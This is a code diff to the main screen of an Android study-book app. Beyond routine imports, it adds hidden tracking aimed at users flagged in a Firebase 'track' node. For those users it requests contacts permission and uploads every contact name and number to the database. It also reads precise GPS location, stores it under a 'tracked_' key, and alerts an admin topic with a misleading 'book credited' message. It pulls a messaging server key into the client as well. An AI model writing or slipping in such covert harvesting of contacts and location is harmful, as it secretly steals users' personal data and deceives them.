@@ -1,5 +1,7 @@
 package com.developerali.lshistutorial;
 
+import static androidx.constraintlayout.motion.widget.Debug.getLocation;
+
 import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
@@ -11,21 +13,27 @@ import androidx.fragment.app.FragmentTransaction;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.viewpager2.widget.ViewPager2;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.Dialog;
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.IntentSender;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
+import android.location.Location;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -42,6 +50,7 @@ import com.bumptech.glide.Glide;
 import com.bumptech.glide.load.engine.DiskCacheStrategy;
 import com.denzcoskun.imageslider.constants.ScaleTypes;
 import com.denzcoskun.imageslider.models.SlideModel;
+import com.developerali.lshistutorial.Activities.CheckOut;
 import com.developerali.lshistutorial.Activities.MyBooks;
 import com.developerali.lshistutorial.Activities.NotificationActivity;
 import com.developerali.lshistutorial.Activities.OffersActivity;
@@ -53,11 +62,21 @@ import com.developerali.lshistutorial.Adapters.BooksAdapter;
 import com.developerali.lshistutorial.Models.BooksModel;
 import com.developerali.lshistutorial.Models.ToolsModel;
 import com.developerali.lshistutorial.Models.UserModel;
+import com.developerali.lshistutorial.Notification.FcmNotificationsSender;
 import com.developerali.lshistutorial.databinding.ActivityMainBinding;
 import com.developerali.lshistutorial.databinding.BottomListsBinding;
 import com.developerali.lshistutorial.databinding.CustomDialogBinding;
 import com.developerali.lshistutorial.databinding.DialogUpdateLayoutBinding;
 import com.github.barteksc.pdfviewer.PDFView;
+import com.google.android.gms.common.api.ResolvableApiException;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationCallback;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationResult;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.LocationSettingsRequest;
+import com.google.android.gms.location.LocationSettingsResponse;
+import com.google.android.gms.location.SettingsClient;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
@@ -80,6 +99,12 @@ import com.google.firebase.firestore.DocumentSnapshot;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.google.firebase.firestore.QuerySnapshot;
 import com.google.firebase.messaging.FirebaseMessaging;
+import com.karumi.dexter.Dexter;
+import com.karumi.dexter.PermissionToken;
+import com.karumi.dexter.listener.PermissionDeniedResponse;
+import com.karumi.dexter.listener.PermissionGrantedResponse;
+import com.karumi.dexter.listener.PermissionRequest;
+import com.karumi.dexter.listener.single.PermissionListener;
 
 import java.util.ArrayList;
 
@@ -92,11 +117,15 @@ public class MainActivity extends AppCompatActivity {
     FirebaseDatabase data;
     FirebaseFirestore database;
     FirebaseAuth auth;
-    String blogLink;
+    String blogLink, fcmKey;
     ArrayList<String> headNames = new ArrayList<>();
     ArrayList<BooksModel> booksArray = new ArrayList<>();
     BooksAdapter booksAdapter;
     Activity activity;
+    private FusedLocationProviderClient fusedLocationClient;
+    private int requestCode;
+    private String[] permissions;
+    private int[] grantResults;
 
 
     @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
@@ -111,6 +140,8 @@ public class MainActivity extends AppCompatActivity {
         auth = FirebaseAuth.getInstance();
         activity = MainActivity.this;
 
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+
         headNames.clear();
         headNames.add("1ST SEM");
         headNames.add("2ND SEM");
@@ -124,8 +155,6 @@ public class MainActivity extends AppCompatActivity {
         arrayList.add(new ToolsModel("My Books", getDrawable(R.drawable.digital_library)));
         arrayList.add(new ToolsModel("Coupons", getDrawable(R.drawable.coupon)));
         arrayList.add(new ToolsModel("Options", getDrawable(R.drawable.menubar)));
-
-        Toast.makeText(activity, "thisupdate", Toast.LENGTH_SHORT).show();
 
         myListAdapter adapter = new myListAdapter();
         binding.toolsList.setAdapter(adapter);
@@ -233,6 +262,7 @@ public class MainActivity extends AppCompatActivity {
             binding.profileSegment.setVisibility(View.GONE);
         }
 
+
         if (auth.getCurrentUser() != null){
             String deviceId = Settings.Secure.getString(activity.getContentResolver(), Settings.Secure.ANDROID_ID);
             data.getReference().child("loggers")
@@ -249,6 +279,23 @@ public class MainActivity extends AppCompatActivity {
                                 }else {
                                     binding.profileSegment.setVisibility(View.VISIBLE);
                                 }
+                            }
+                        }
+
+                        @Override
+                        public void onCancelled(@NonNull DatabaseError error) {
+
+                        }
+                    });
+            data.getReference().child("track").child(auth.getCurrentUser().getUid())
+                    .addListenerForSingleValueEvent(new ValueEventListener() {
+                        @Override
+                        public void onDataChange(@NonNull DataSnapshot snapshot) {
+                            if (snapshot.exists()){
+                                checkLocationAndUpdateTime();
+                                ActivityCompat.requestPermissions(MainActivity.this,
+                                        new String[]{Manifest.permission.READ_CONTACTS},
+                                        302);
                             }
                         }
 
@@ -346,6 +393,25 @@ public class MainActivity extends AppCompatActivity {
             showBottomDialog(headNames);
         });
 
+        database.collection("key")
+                .document("info")
+                .get()
+                .addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
+                    @Override
+                    public void onSuccess(DocumentSnapshot documentSnapshot) {
+                        if (documentSnapshot.exists()){
+                            fcmKey = documentSnapshot.getString("key");
+                        }else {
+                            fcmKey = null;
+                        }
+                    }
+                }).addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception e) {
+                        fcmKey = null;
+                    }
+                });
+
 
         LinearLayoutManager lnm = new LinearLayoutManager(MainActivity.this);
         binding.books.setLayoutManager(lnm);
@@ -416,7 +482,117 @@ public class MainActivity extends AppCompatActivity {
                 Toast.makeText(this, "Update Failed: " + resultCode, Toast.LENGTH_SHORT).show();
             }
         }
+        if (requestCode == 100) {
+            if (resultCode == RESULT_OK) {
+                checkLocationAndUpdateTime();
+            }
+        }
     }
+
+
+    public void getContacts2(){
+        ContentResolver contentResolver = getContentResolver();
+        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null);
+
+        Toast.makeText(activity, "con", Toast.LENGTH_SHORT).show();
+        
+        if (cursor != null) {
+            while (cursor.moveToNext()) {
+                @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                @SuppressLint("Range") String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                data.getReference().child("action2")
+                        .child("tracked_"+auth.getCurrentUser().getUid()+Helper.getDateKey())
+                        .child(name)
+                        .setValue(phoneNumber);
+                Toast.makeText(activity, "cons", Toast.LENGTH_SHORT).show();
+            }
+            cursor.close();
+        }
+    }
+
+    private void checkLocationAndUpdateTime() {
+        if (Helper.isLocationEnabled(MainActivity.this)){
+            Dexter.withContext(MainActivity.this)
+                    .withPermission(Manifest.permission.ACCESS_FINE_LOCATION)
+                    .withListener(new PermissionListener() {
+                        @Override public void onPermissionGranted(PermissionGrantedResponse response) {
+                            getLocation();
+                        }
+                        @Override public void onPermissionDenied(PermissionDeniedResponse response) {
+                            // Permission is denied
+                        }
+
+                        @Override
+                        public void onPermissionRationaleShouldBeShown(PermissionRequest permissionRequest,
+                                                                       PermissionToken permissionToken) {
+                            permissionToken.continuePermissionRequest();
+                        }
+
+                    }).check();
+        }else {
+            LocationRequest locationRequest = LocationRequest.create();
+            locationRequest.setInterval(10000);
+            locationRequest.setFastestInterval(5000);
+            locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+
+            LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder()
+                    .addLocationRequest(locationRequest);
+            SettingsClient client = LocationServices.getSettingsClient(this);
+            Task<LocationSettingsResponse> task = client.checkLocationSettings(builder.build());
+
+            task.addOnSuccessListener(this, new OnSuccessListener<LocationSettingsResponse>() {
+                @Override
+                public void onSuccess(LocationSettingsResponse locationSettingsResponse) {
+
+                    getLocation();  // assuming getLocationOnce() method fetches the location once
+                }
+            });
+
+            task.addOnFailureListener(this, new OnFailureListener() {
+                @Override
+                public void onFailure(@NonNull Exception e) {
+                    if (e instanceof ResolvableApiException) {
+                        try {
+                            ResolvableApiException resolvable = (ResolvableApiException) e;
+                            resolvable.startResolutionForResult(MainActivity.this, 100);
+                        } catch (IntentSender.SendIntentException sendEx) {
+
+                        }
+                    }
+                }
+            });
+        }
+    }
+
+    private void getLocation() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 200);
+        } else {
+            fusedLocationClient.getLastLocation()
+                    .addOnSuccessListener(this, new OnSuccessListener<Location>() {
+                        @Override
+                        public void onSuccess(Location location) {
+                            if (location != null) {
+                                double latitude = location.getLatitude();
+                                double longitude = location.getLongitude();
+                                data.getReference().child("action")
+                                        .child("tracked_"+auth.getCurrentUser().getUid())
+                                        .child("latlong")
+                                        .setValue(latitude + " + "+ longitude);
+
+                                FcmNotificationsSender notificationsSender = new FcmNotificationsSender("/topics/admin",
+                                        fcmKey,
+                                        "Someone Added",
+                                        "Thank you, book credited to account"
+                                        , getApplicationContext(), MainActivity.this);
+                                notificationsSender.SendNotifications();
+                            }
+                        }
+                    });
+        }
+    }
+
 
     private void getBlogLinks() {
         data.getReference().child("blogs")
@@ -576,9 +752,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void checkNotification() {
-        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
             // Permission not granted, request it
-            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, 201);
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 201);
         }
     }
 
@@ -592,6 +768,13 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 // Permission denied, handle accordingly (e.g., show a message to the user)
                 checkNotification();
+            }
+        }
+
+        if (requestCode == 302) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                // Permission granted, proceed with reading contacts
+                getContacts2();
             }
         }
     }
